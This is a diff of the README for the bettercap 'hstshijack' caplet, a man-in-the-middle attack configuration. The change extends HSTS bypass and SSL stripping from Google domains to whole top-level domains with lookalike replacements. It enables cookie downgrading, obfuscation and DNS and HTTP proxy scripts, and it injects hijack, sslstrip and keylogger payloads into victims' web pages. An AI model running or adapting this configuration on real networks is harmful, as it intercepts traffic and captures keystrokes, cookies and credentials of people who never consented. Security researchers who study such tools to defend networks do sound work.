@@ -2,32 +2,38 @@
   <img width="420px" src="https://raw.githubusercontent.com/buffermet/cdn/master/github.com/bettercap/caplets/hstshijack/logo.svg" />
 </p>
 
-### Caplet
+### Caplet ([hstshijack.cap](https://github.com/bettercap/caplets/blob/master/hstshijack/hstshijack.cap))
 
 ```sh
 # Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack
 
 # Domains assigned to 'hstshijack.targets', 'hstshijack.blockscripts' and 'hstshijack.payloads'
 # variables get precendence over those assigned to the 'hstshijack.ignore' variable.
-set hstshijack.targets         *.google.com, google.com, gstatic.com, *.gstatic.com
-set hstshijack.replacements    *.google.corn,google.corn,gstatic.corn,*.gstatic.corn
-set hstshijack.ssl.domains     /usr/local/share/bettercap/caplets/hstshijack/domains.txt
-set hstshijack.ssl.index       /usr/local/share/bettercap/caplets/hstshijack/index.json
-set hstshijack.ssl.check       true
-#set hstshijack.blockscripts    example.com,*.example.com
-set hstshijack.obfuscate       true
-set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
-set hstshijack.whitelist       /usr/local/share/bettercap/caplets/hstshijack/whitelist.json
-set hstshijack.ignore          captive.apple.com,connectivitycheck.gstatic.com,detectportal.firefox.com,www.msftconnecttest.com
+set hstshijack.targets                    *.com, *.net,*.me, *.nl,*.ai,*.co.uk,*.cn,*.google
+set hstshijack.replacements               *.corn,*.nel,*.rne,*.ni,*.al,*.cc.uk,*.ch,*.googl
+set hstshijack.replacements.req.body      /usr/local/share/bettercap/caplets/hstshijack/replacements/req.body.json
+set hstshijack.replacements.req.headers   /usr/local/share/bettercap/caplets/hstshijack/replacements/req.headers.json
+set hstshijack.replacements.res.body      /usr/local/share/bettercap/caplets/hstshijack/replacements/res.body.json
+set hstshijack.replacements.res.headers   /usr/local/share/bettercap/caplets/hstshijack/replacements/res.headers.json
+set hstshijack.ssl.domains                /usr/local/share/bettercap/caplets/hstshijack/ssl/domains.txt
+set hstshijack.ssl.index                  /usr/local/share/bettercap/caplets/hstshijack/ssl/index.json
+set hstshijack.ssl.index.check            true
+set hstshijack.ssl.discovery.synchronous  true
+set hstshijack.ssl.discovery.timeout      4
+set hstshijack.cookies.downgrade          true
+#set hstshijack.blockscripts               example.com,*.example.com
+set hstshijack.obfuscate                  true
+set hstshijack.payloads                   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google-search.js,google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google-search.js
+set hstshijack.whitelist                  /usr/local/share/bettercap/caplets/hstshijack/session/whitelist.json
+set hstshijack.ignore                     captive.apple.com,connectivitycheck.gstatic.com,detectportal.firefox.com,www.msftconnecttest.com
 
 net.recon on
 
-set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/modules/hstshijack.js
 http.proxy on
 
-set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn
-set dns.spoof.all      true
-dns.spoof on
+set dns.proxy.script /usr/local/share/bettercap/caplets/hstshijack/modules/dns.proxy.js
+dns.proxy on
 ```
 
 ### <a href="./payloads/hijack.js">**hijack.js**</a> payload
